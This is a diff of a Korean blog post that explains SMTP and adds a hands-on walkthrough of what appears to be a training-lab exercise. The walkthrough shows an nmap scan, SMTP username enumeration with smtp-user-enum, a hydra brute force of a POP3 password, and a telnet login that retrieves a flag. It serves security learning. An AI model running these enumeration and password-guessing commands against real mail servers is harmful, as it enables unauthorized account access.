@@ -27,7 +27,10 @@ SMTP는 원래 평문 프로토콜이므로 **인증 정보와 명령이 그대�
 ![Domain](/assets/network-screenshots/smtp/smtp-imap.png)
 
 - 클라이언트(MUA) → Mail Submission Agent(MSA) → Mail Transfer Agent(MTA) → Mail Delivery Agent(MDA) → Mailbox(POP3/IMAP)
+
 - 전송 흐름: 클라이언트가 SMTP 서버에 접속하여 `MAIL FROM`, `RCPT TO`, `DATA` 명령으로 메일을 제출한다. 서버는 DNS를 통해 수신측 MTA 주소를 검색해 전송을 이어간다.
+
+---
 
 # 주요 명령어
 
@@ -142,3 +145,105 @@ QUIT
 ---
 
 # 실습
+
+## Portscan
+
+먼저 대상 Host(`10.129.179.133`)에 대해 기본 스크립트와 서비스 버전 탐지를 수행하였다.
+
+```bash
+$ nmap -sC -sV 10.129.179.133
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-27 17:14 EDT
+Nmap scan report for 10.129.179.133
+Host is up (0.26s latency).
+Not shown: 995 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+25/tcp   open  smtp          hMailServer smtpd
+| smtp-commands: WIN-02, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+110/tcp  open  pop3          hMailServer pop3d
+|_pop3-capabilities: USER UIDL TOP
+143/tcp  open  imap          hMailServer imapd
+|_imap-capabilities: QUOTA NAMESPACE ACL RIGHTS=texkA0001 CHILDREN IMAP4 CAPABILITY OK IMAP4rev1 IDLE SORT completed
+587/tcp  open  smtp          hMailServer smtpd
+| smtp-commands: WIN-02, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: WIN-02
+|   NetBIOS_Domain_Name: WIN-02
+|   NetBIOS_Computer_Name: WIN-02
+|   DNS_Domain_Name: WIN-02
+|   DNS_Computer_Name: WIN-02
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-09-27T21:14:53+00:00
+|_ssl-date: 2025-09-27T21:14:57+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=WIN-02
+| Not valid before: 2025-09-26T21:09:18
+|_Not valid after:  2026-03-28T21:09:18
+Service Info: Host: WIN-02; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 51.50 seconds
+```
+
+Nmap 스캔을 통해 총 4개의 주요 서비스(`SMTP`, `POP3`, `IMAP` `RDP`)가 확인되었다.
+
+## SMTP 브루트포싱
+
+문제에서 제공된 `inlanefreight.htb` 도메인을 대상으로 `smtp-user-enum` 명령어를 이용해 `RCPT` 모드로 사용자 아이디 브루트포싱을 수행했다.
+
+```bash
+$ smtp-user-enum -M RCPT -U ./Desktop/users.list -D inlanefreight.htb -t 10.129.179.133
+```
+
+브루트포싱 결과, `marlin@inlanefreight.htb` 계정이 유효한 것으로 확인되었다. 
+
+![Domain](/assets/network-screenshots/smtp/smtp-brute-force.png)
+
+## POP3 비밀번호 브루트포싱
+
+`marlin@inlanefreight.htb` 계정에 대해 `hydra`를 사용해 POP3 비밀번호 브루트포싱을 시도하였다.
+
+```bash
+hydra -l marlin@inlanefreight.htb -P ./Desktop/pws.list -f 10.129.179.133 pop3
+```
+
+브루트포싱 결과 `marlin@inlanefreight.htb` 계정의 비밀번호가 `poohbear` 로 확인되었다.
+
+![Domain](/assets/network-screenshots/smtp/pop3-hydra.png)
+
+## telnet POP3 접속
+
+POP3 관련 절차는 별도 포스트에 있습니다 — [POP3 포스트 보기](../imap-pop3.md).
+
+`telnet`로 POP3 프토토콜에 접속하여 브루트포싱으로 획득한 자격증명으로 로그인 성공을 확인하였다.
+
+```bash
+$ telnet 10.129.179.133 110
+Trying 10.129.179.133...
+Connected to 10.129.179.133.
+Escape character is '^]'.
++OK POP3
+USER marlin@inlanefreight.htb
++OK Send your password
+PASS poohbear
++OK Mailbox locked and ready
+```
+
+## Flag 획득 
+
+이후, `LIST` 명령어로 메시지 존재 여부를 확인하였다.
+
+```bash
+LIST
+
++OK 1 messages (601 octets)
+1 601
+.
+```
+
+그 후, `RETR 1` 명령어를 활용하여 메세지를 열람한 결과
+
+![Domain](/assets/network-screenshots/smtp/flag.png)
+
+이렇게 최종적으로 **flag**를 확보할 수 있었다.
